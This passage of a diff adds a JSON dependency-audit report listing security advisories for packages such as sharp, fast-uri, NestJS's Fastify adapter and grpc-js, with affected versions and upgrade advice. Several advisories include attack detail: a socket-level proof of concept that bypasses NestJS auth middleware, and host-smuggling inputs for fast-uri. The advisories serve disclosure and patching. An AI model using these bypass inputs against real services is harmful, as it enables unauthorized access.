+      "github_advisory_id": "GHSA-jqff-g426-hqxp",
+      "recommendation": "Upgrade to version 3.1.6 or later",
+      "patched_versions": ">=3.1.6",
+      "updated": "2026-09-02T15:41:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-177"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqff-g426-hqxp"
+    },
+    "1193725": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__web>next>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-rgj7-g3m4-5g8c\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545\n- https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497\n- https://github.com/lovell/sharp/releases/tag/v0.35.4\n- https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+      "created": "2026-09-08T21:25:11.000Z",
+      "id": 1193725,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA number of vulnerabilities, two rated as \"Critical\" severity using CVSSv3, have been discovered and fixed in the upstream libheif dependency. These can lead to possible remote code execution (RCE) on glibc-based Linux when run under certain conditions.\n\nThe attack vector for these claims to be \"network\" however sharp does not provide any networking features so this vulnerability is down-rated to a \"High\" severity using CVSSv4 but please note its Subsequent System Impact.\n\nThose processing untrusted input with versions of sharp prior to 0.35.4 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.4, which provides libheif 1.23.2.\n\n#### Using a globally-installed libheif?\n\nPlease ensure you are using the latest libheif 1.23.2.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding AVIF images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadHeif\"] });\n```\n\nEnsure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already do this for protection against RCE however be warned that the \"official\" Node.js binaries do not.\n\n### References\n- [CVE-2026-84383](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+      "reported_by": null,
+      "title": "sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.4",
+      "github_advisory_id": "GHSA-rgj7-g3m4-5g8c",
+      "recommendation": "Upgrade to version 0.35.4 or later",
+      "patched_versions": ">=0.35.4",
+      "updated": "2026-09-08T21:25:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-122"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c"
+    },
+    "1204921": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-4c8g-83qw-93j6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-13676\n- https://github.com/fastify/fast-uri/pull/188\n- https://github.com/fastify/fast-uri/commit/2a6d357a18a68e6d812824379fd3388a1ae50d05\n- https://github.com/fastify/fast-uri/commit/21ea1f9d70495c931f55dff893a8fa38f4f2e6bd\n- https://github.com/fastify/fast-uri/commit/01db48010f594b98f7b323be18b393791c66ed1d\n- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-13676.json\n- https://github.com/fastify/fast-uri/releases/tag/v4.0.1\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.3\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.2\n- https://cna.openjsf.org/security-advisories.html\n- https://bugzilla.redhat.com/show_bug.cgi?id=2494197\n- https://access.redhat.com/security/cve/CVE-2026-13676\n- https://access.redhat.com/errata/RHSA-2026:41929\n- https://access.redhat.com/errata/RHSA-2026:41928\n- https://access.redhat.com/errata/RHSA-2026:41066\n- https://access.redhat.com/errata/RHSA-2026:40945\n- https://access.redhat.com/errata/RHSA-2026:40262\n- https://access.redhat.com/errata/RHSA-2026:40118\n- https://access.redhat.com/errata/RHSA-2026:37628\n- https://access.redhat.com/errata/RHSA-2026:37585\n- https://access.redhat.com/errata/RHSA-2026:37186\n- https://access.redhat.com/errata/RHSA-2026:43038\n- https://access.redhat.com/errata/RHSA-2026:42815\n- https://access.redhat.com/errata/RHSA-2026:40765\n- https://access.redhat.com/errata/RHSA-2026:44239\n- https://access.redhat.com/errata/RHSA-2026:44268\n- https://access.redhat.com/errata/RHSA-2026:48126\n- https://access.redhat.com/errata/RHSA-2026:48124\n- https://access.redhat.com/errata/RHSA-2026:49642\n- https://access.redhat.com/errata/RHSA-2026:50479\n- https://access.redhat.com/errata/RHSA-2026:50340\n- https://access.redhat.com/errata/RHSA-2026:47728\n- https://access.redhat.com/errata/RHSA-2026:51196\n- https://access.redhat.com/errata/RHSA-2026:51197\n- https://access.redhat.com/errata/RHSA-2026:51342\n- https://access.redhat.com/errata/RHSA-2026:51348\n- https://access.redhat.com/errata/RHSA-2026:51349\n- https://access.redhat.com/errata/RHSA-2026:50758\n- https://access.redhat.com/errata/RHSA-2026:54760\n- https://access.redhat.com/errata/RHSA-2026:56366\n- https://access.redhat.com/errata/RHSA-2026:56431\n- https://access.redhat.com/errata/RHSA-2026:57013\n- https://access.redhat.com/errata/RHSA-2026:57191\n- https://access.redhat.com/errata/RHSA-2026:57194\n- https://access.redhat.com/errata/RHSA-2026:57590\n- https://access.redhat.com/errata/RHSA-2026:59593\n- https://access.redhat.com/errata/RHSA-2026:60386\n- https://access.redhat.com/errata/RHSA-2026:60520\n- https://access.redhat.com/errata/RHSA-2026:61314\n- https://access.redhat.com/errata/RHSA-2026:63371\n- https://access.redhat.com/errata/RHSA-2026:66488\n- https://access.redhat.com/errata/RHSA-2026:66545\n- https://github.com/advisories/GHSA-4c8g-83qw-93j6",
+      "created": "2026-07-21T19:03:11.000Z",
+      "id": 1204921,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` versions `>= 2.3.1, <= 4.0.0` fail to canonicalize Unicode/IDN hostnames for HTTP-family URLs. The IDN conversion path calls `URL.domainToASCII(...)` on the global WHATWG `URL` constructor, where that helper does not exist. The resulting `TypeError` is silently routed into `parsed.error`, but `parse()`, `normalize()`, and `equal()` all return with the host left in its original Unicode form.\n\nFor example, `http://127。0。0。1/` is treated by `fast-uri` as host `127。0。0。1`, while Node's WHATWG URL parser and `fetch()` canonicalize the same input to `127.0.0.1`.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) before passing the same URL into Node's URL or `fetch()` consumers see a policy/use desync and can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` v4.0.1, v3.1.3, or v2.4.2\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via failed IDN canonicalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-13676"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.3",
+      "github_advisory_id": "GHSA-4c8g-83qw-93j6",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-09-11T15:32:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436",
+        "CWE-551"
+      ],
+      "url": "https://github.com/advisories/GHSA-4c8g-83qw-93j6"
+    },
+    "1239943": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-qw65-cvwx-89v3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84292\n- https://github.com/fastify/fast-uri/commit/820e8478dd7da3d09f187bfaf35d50b71f67b8b4\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.6\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.7\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.4\n- https://github.com/advisories/GHSA-qw65-cvwx-89v3",
+      "created": "2026-09-28T21:24:39.000Z",
+      "id": 1239943,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` serializes the `port` component of a URI without validating it. When recomposing the authority, `fast-uri` escapes the userinfo and host components but concatenates the port verbatim, so a `port` value that is not a sequence of digits can inject authority delimiters. For example, serializing a component whose `port` is `@127.0.0.1:8124` produces `http://trusted.example:@127.0.0.1:8124/app`, demoting the intended host to userinfo and pointing the authority at an attacker-controlled host. Both `fast-uri` and Node's `URL` read the result back as the attacker's host with no error, so re-validating the built URI does not catch it.\n\nThis affects applications that build URIs from parts and assign untrusted data to the `port` component (for example a fixed host from configuration and a port taken from user input or a service record). The same path is reachable through `serialize()`, `normalize()`, and `equal()` in their object forms. A `port` obtained from `parse()` is always digits and is not affected.\n\n### Patches\n\nThis vulnerability has been patched in fast-uri `4.1.4`, `3.1.7`, and `2.4.6`. `recomposeAuthority` now rejects any port that is not `*DIGIT` per RFC 3986. All users should upgrade.\n\n### Workarounds\n\nIf upgrading is not immediately possible, validate the `port` value against the RFC 3986 grammar (digits only) before passing a component to `serialize()`, `normalize()`, or `equal()`, and reject anything else, for example `if (!/^\\d*$/.test(String(port))) throw new Error('invalid port')`.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to authority injection via an unvalidated port in serialize",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84292"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.7",
+      "github_advisory_id": "GHSA-qw65-cvwx-89v3",
+      "recommendation": "Upgrade to version 3.1.7 or later",
+      "patched_versions": ">=3.1.7",
+      "updated": "2026-09-28T21:24:40.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-qw65-cvwx-89v3"
+    },
+    "1240091": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-hrr3-gc8f-f4qj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-86472\n- https://github.com/fastify/fast-uri/commit/5dabb86732aa2a7655e258719970e61e12b6b4d1\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.7\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.8\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.5\n- https://github.com/advisories/GHSA-hrr3-gc8f-f4qj",
+      "created": "2026-09-29T23:54:25.000Z",
+      "id": 1240091,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` folds the host to lowercase before it percent-decodes the host, so a percent-encoded uppercase unreserved octet such as `%41` decodes to a literal `A` that is never folded. For a scheme-relative reference (`//host`) there is no scheme, so the host canonicalization that repairs this on a scheme-bearing URL does not run. As a result `parse`, `normalize`, and `equal` disagree on the same host: `parse(\"//%41.com\").host` returns `\"A.com\"` while `parse(\"//a.com\").host` and `parse(\"//A.com\").host` return `\"a.com\"`, and `equal(\"//%41.com\", \"//a.com\")` is `false` even though `equal(\"//A.com\", \"//a.com\")` is `true`. An application that makes a case-sensitive host decision on `fast-uri` output for a scheme-relative reference, for example a host allowlist or denylist that compares `parse(url).host` or uses `fast-uri.equal`, can be steered past the check with a percent-encoded uppercase octet. Because a hostname is case-insensitive in DNS and HTTP routing, the evading spelling reaches the same host the check meant to gate, so the effect is check evasion rather than reaching a different registrable host.\n\n### Patches\n\nUpgrade to `fast-uri` 4.1.5, 3.1.8, or 2.4.7.\n\n### Workarounds\n\nCompare hosts case-insensitively (lowercase the parsed host before any allowlist or denylist decision), or avoid making case-sensitive host decisions on scheme-relative input until upgrading.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to inconsistent host case normalization via percent-encoded octets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-86472"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.8",
+      "github_advisory_id": "GHSA-hrr3-gc8f-f4qj",
+      "recommendation": "Upgrade to version 3.1.8 or later",
+      "patched_versions": ">=3.1.8",
+      "updated": "2026-09-29T23:54:26.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-hrr3-gc8f-f4qj"
+    },
+    "1240613": {
+      "findings": [
+        {
+          "version": "11.1.27",
+          "paths": [
+            "apps__api>@nestjs/platform-fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/middie/security/advisories/GHSA-hx87-8wv7-pjv8\n- https://github.com/nestjs/nest/security/advisories/GHSA-9c5c-9qcx-q35q\n- https://github.com/nestjs/nest/pull/17737\n- https://github.com/nestjs/nest/commit/5226fe084cf64b357de436f154bc89f2d319b621\n- https://github.com/nestjs/nest/commit/dda252090ecb65009d9ff366444303796fc44fd7\n- https://github.com/nestjs/nest/releases/tag/v11.2.4\n- https://github.com/nestjs/nest/releases/tag/v12.0.2\n- https://github.com/advisories/GHSA-9c5c-9qcx-q35q",
+      "created": "2026-09-30T14:41:39.000Z",
+      "id": 1240613,
+      "npm_advisory_id": null,
+      "overview": "| Field | Value |\n| --- | --- |\n| Ecosystem | npm |\n| Package | `@nestjs/platform-fastify` |\n| Affected versions | `>= 12.0.0, < 12.0.2` and `< 11.2.4` |\n| Patched versions | `12.0.2` and `11.2.4` (upgrade to `12.0.3` / `11.2.5`) |\n\n### Summary\n\nOn the Fastify adapter, an HTTP request that uses an **absolute-form request target** (`GET http://host/path HTTP/1.1`\ninstead of `GET /path HTTP/1.1`) reaches the route handler without running the path-scoped Nest middleware bound to\nthat route. Applications that enforce authentication or authorization in middleware execute the protected handler\nwith those checks skipped.\n\n### Impact\n\nAny application that\n\n- uses `@nestjs/platform-fastify`, and\n- binds middleware to specific paths via `MiddlewareConsumer.forRoutes(...)` or `.exclude(...)`, and\n- is reachable by a client that controls the raw request line.\n\nNode's HTTP server accepts absolute-form targets, so no special server configuration is needed. Exposure is reduced\nwhen a reverse proxy in front of the application rewrites the request target to origin-form, which most do.\n\nWhere the bypassed middleware performs authentication or authorization, the result is an authentication or\nauthorization bypass. Where it performs logging, rate limiting or body handling, those are silently skipped instead.\n\n### Details\n\nFastify's router (`find-my-way`) resolves an absolute-form target to its path before matching, so the route handler\nis dispatched normally. Two places on the middleware side matched against the **raw** request target instead:\n\n1. The bundled copy of the `@fastify/middie` engine at `packages/platform-fastify/adapters/middie/fastify-middie.ts`.\n   NestJS carried this fork to apply an earlier path-decoding fix and it did not track the upstream absolute-form fix\n   released in `@fastify/middie@9.3.4`.\n2. `FastifyAdapter`'s own re-check in `createMiddlewareFactory()`, which tests the middleware path regexp against\n   `req.originalUrl`.\n\nBoth normalized and percent-decoded the target, but neither resolved absolute-form to a path, so the router and the\nmiddleware layer disagreed about which path was being requested.\n\nA second, related defect contributed. Because the adapter always passes `routerOptions` (to install the version\nconstraint), Fastify did not reflect the deprecated **top-level** router options (`ignoreTrailingSlash`,\n`ignoreDuplicateSlashes`, `caseSensitive`, `useSemicolonDelimiter`) in `initialConfig.routerOptions`, which is what\nthe middleware engine reads. Applications passing those options at the top level had middleware normalize paths\ndifferently from the router, which widened the mismatch.\n\n### Proof of concept\n\n```ts\n@Controller('users')\nexport class UsersController {\n  @Get()\n  findAll() {\n    return 'protected data';\n  }\n}\n\n@Module({ controllers: [UsersController] })\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer\n      .apply((req, res) => res.end('blocked by auth middleware'))\n      .forRoutes({ path: 'users', method: RequestMethod.GET });\n  }\n}\n```\n\n`supertest` and `light-my-request` always emit origin-form targets, so the request has to be written to the socket:\n\n```js\nconst { connect } = require('node:net');\n\nconst socket = connect(3000, '127.0.0.1', () => {\n  socket.write(\n    'GET http://127.0.0.1:3000/users HTTP/1.1\\r\\n' +\n      'Host: 127.0.0.1:3000\\r\\n' +\n      'Connection: close\\r\\n\\r\\n',\n  );\n});\nsocket.pipe(process.stdout);\n```\n\nObserved on an affected version: `protected data` — the middleware did not run.\nExpected, and observed on a patched version: `blocked by auth middleware`.\n\n### Patches\n\nFixed in **12.0.2** and **11.2.4**. Upgrading to **12.0.3** or **11.2.5** is recommended.\n\n- The bundled `@fastify/middie` fork was removed and the package now depends on `@fastify/middie@9.3.4`, which\n  resolves absolute-form targets before matching.\n- The adapter resolves absolute-form targets in its own route check, mirroring `find-my-way`.\n- Deprecated top-level Fastify router options are folded into `routerOptions` so the middleware engine and the\n  router normalize paths identically.\n\n### Workarounds\n\nIf you cannot upgrade, reject non-origin-form request targets before middleware runs. Register the hook on the\nFastify instance **before the application is initialized**, so that it runs ahead of the middleware engine's own\n`onRequest` hook, and confirm with the request above that the rejection takes effect:\n\n```ts\nconst adapter = new FastifyAdapter();\nadapter.getInstance().addHook('onRequest', (request, reply, done) => {\n  const target = request.raw.url ?? '';\n  // \"*\" is the legitimate request target of \"OPTIONS * HTTP/1.1\"\n  if (target[0] !== '/' && target !== '*') {\n    reply.code(400).send();\n    return;\n  }\n  done();\n});\n```\n\nRejecting or normalizing absolute-form targets at a reverse proxy in front of the application is equally effective.\n\n### Credit\n\nReported by ZeroVuln Labs.",
+      "reported_by": null,
+      "title": "@nestjs/platform-fastify: Path-scoped middleware bypass via absolute-form request targets",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@nestjs/platform-fastify",
+      "vulnerable_versions": "<11.2.4",
+      "github_advisory_id": "GHSA-9c5c-9qcx-q35q",
+      "recommendation": "Upgrade to version 11.2.4 or later",
+      "patched_versions": ">=11.2.4",
+      "updated": "2026-09-30T14:41:40.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-288",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-9c5c-9qcx-q35q"
+    },
+    "1240622": {
+      "findings": [
+        {
+          "version": "1.14.4",
+          "paths": [
+            "packages__ai-runtime>@opentelemetry/sdk-node>@opentelemetry/otlp-grpc-exporter-base>@grpc/grpc-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/grpc/grpc-node/security/advisories/GHSA-m9gg-hp2v-232j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-101916\n- https://github.com/grpc/grpc-node/commit/2a84ec8b01b9db68ed9d2b117a53a81449edb8ee\n- https://github.com/grpc/grpc-node/commit/b4e0079c6d22a2adedfcac748e0bc083f783bc7c\n- https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js%401.14.5\n- https://github.com/advisories/GHSA-m9gg-hp2v-232j",
+      "created": "2026-09-30T15:35:53.000Z",
+      "id": 1240622,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nWhen server credentials are created with the `requireClientCertificate` option set to `false`, `getAuthContext` does not distinguish between authorized and unauthorized certificates in its return value. This can create improper authentication vulnerabilities for `@grpc/grpc-js` users who use the result of `getAuthContext` for authentication.\n\nIn particular, `@grpc/grpc-js-xds` can both set the `requireClientCertificate` option to `false` and use the return value of `getAuthContext` for RBAC authentication in some configurations.\n\n### Patches\n\nThis vulenrability is fixed in 1.13.6 and 1.14.5.\n\n### Workarounds\n`@grpc/grpc-js` users using `getAuthContext` this way can avoid this problem by setting `requireClientCertificate` to `true`. `@grpc/grpc-js-xds` users using RBAC can avoid this by setting the `require_client_certificate` field to `true` in the DownstreamTlsContext in the xDS configuration.",
+      "reported_by": null,
+      "title": "@grpc/grpc-js: In certain configurations, getAuthContext can return unauthorized certificates as though they were authorized",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-101916"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@grpc/grpc-js",
+      "vulnerable_versions": ">=1.14.0 <1.14.5",
+      "github_advisory_id": "GHSA-m9gg-hp2v-232j",
+      "recommendation": "Upgrade to version 1.14.5 or later",
+      "patched_versions": ">=1.14.5",
+      "updated": "2026-09-30T15:35:57.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-295"
+      ],
+      "url": "https://github.com/advisories/GHSA-m9gg-hp2v-232j"
+    },
+    "1240624": {
+      "findings": [
+        {
+          "version": "1.14.4",
+          "paths": [
+            "packages__ai-runtime>@opentelemetry/sdk-node>@opentelemetry/otlp-grpc-exporter-base>@grpc/grpc-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/grpc/grpc-node/security/advisories/GHSA-f596-whhp-79r4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-101915\n- https://github.com/grpc/grpc-node/commit/350de32860428cc62473a00bee4035360690ffea\n- https://github.com/grpc/grpc-node/commit/7c5c5181159c6ddd292805881ef2cdec29bb475f\n- https://github.com/grpc/grpc-node/commit/e8329b122ca99ba10877e990c2f6edd40224fd0d\n- https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js%401.13.6\n- https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js%401.14.5\n- https://github.com/advisories/GHSA-f596-whhp-79r4",
+      "created": "2026-09-30T15:35:41.000Z",
+      "id": 1240624,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nIf an application method handler crashes, the error message is included in the status message sent to the client. This can leak to the client any sensitive data that may be included in the error message. This impacts anyone using `@grpc/grpc-js` to run servers.\n\n### Patches\nThis vulnerability is fixed in 1.13.6 and 1.14.5.\n\n### Workarounds\nThis can be avoided by using a top-level error handler in method handlers to strip out sensitive error information.",
+      "reported_by": null,
+      "title": "@grpc/grpc-js: The server transmits some error messages thrown by method handlers to the client in status messages",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-101915"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@grpc/grpc-js",
+      "vulnerable_versions": ">=1.14.0 <1.14.5",
+      "github_advisory_id": "GHSA-f596-whhp-79r4",
+      "recommendation": "Upgrade to version 1.14.5 or later",
+      "patched_versions": ">=1.14.5",
+      "updated": "2026-09-30T15:35:42.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-550"
+      ],
+      "url": "https://github.com/advisories/GHSA-f596-whhp-79r4"
+    },
+    "1241202": {
+      "findings": [
+        {
+          "version": "1.0.3",
+          "paths": [
+            "packages__domain>mammoth>argparse>sprintf-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-97058\n- https://github.com/alexei/sprintf.js/issues/237\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L17\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L84-L90\n- https://www.vulncheck.com/advisories/sprintf-js-through-1.1.3-denial-of-service-via-unbounded-precision\n- https://github.com/advisories/GHSA-hp3w-g68c-fv3c",
+      "created": "2026-09-24T15:31:31.000Z",
+      "id": 1241202,
+      "npm_advisory_id": null,
+      "overview": "sprintf-js through 1.1.3 passes unbounded precision specifiers to toFixed, toExponential, and toPrecision methods without validation, causing uncaught RangeError exceptions. Attackers who control format strings can inject precision values exceeding ECMAScript limits to abort calling operations with minimal payload.",
+      "reported_by": null,
+      "title": "sprintf-js vulnerable to denial of service through unbounded precision specifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-97058"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sprintf-js",
+      "vulnerable_versions": "<=1.1.3",
+      "github_advisory_id": "GHSA-hp3w-g68c-fv3c",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-05T23:47:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-hp3w-g68c-fv3c"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps__web>next>postcss>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241331": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__web>next>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w\n- https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236\n- https://github.com/lovell/sharp/releases/tag/v0.35.5\n- https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241\n- https://www.cve.org/CVERecord?id=CVE-2026-96889\n- https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+      "created": "2026-10-06T13:43:57.000Z",
+      "id": 1241331,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+      "reported_by": null,
+      "title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.5",
+      "github_advisory_id": "GHSA-wq5f-xc86-pv6w",
+      "recommendation": "Upgrade to version 0.35.5 or later",
+      "patched_versions": ">=0.35.5",
+      "updated": "2026-10-06T13:43:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-416",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w"
+    }
+  },
+  "muted": [],
+  "metadata": {
